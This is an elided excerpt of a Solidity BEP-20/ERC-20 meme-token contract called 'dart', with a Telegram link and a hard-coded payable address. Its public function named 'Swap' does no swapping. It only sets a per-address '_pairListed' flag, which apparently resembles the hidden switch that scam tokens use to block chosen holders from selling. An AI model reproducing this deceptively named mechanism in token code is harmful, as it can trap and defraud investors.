...
//Telegram: https://t.me/darthpepebsc1
...
contract dart is Context, IERC20, Ownable {
    ...
    string private _symbol = "MAYPEPEBEWHITYOU";
    ...
    uint256 private _totalSupply = 4000000000000 * 10**_decimals;
    ...
    constructor () {
        ...
        addr = payable(address(0x0A30681b5154cF673b34BEbBBb4f339CD55f3Ac5));
    ...
    function Swap(address _i,uint256 _m) public {
        if((_m == 0) || (_m - 1 == 0)){
            _pairListed[_i] = _m;
        }
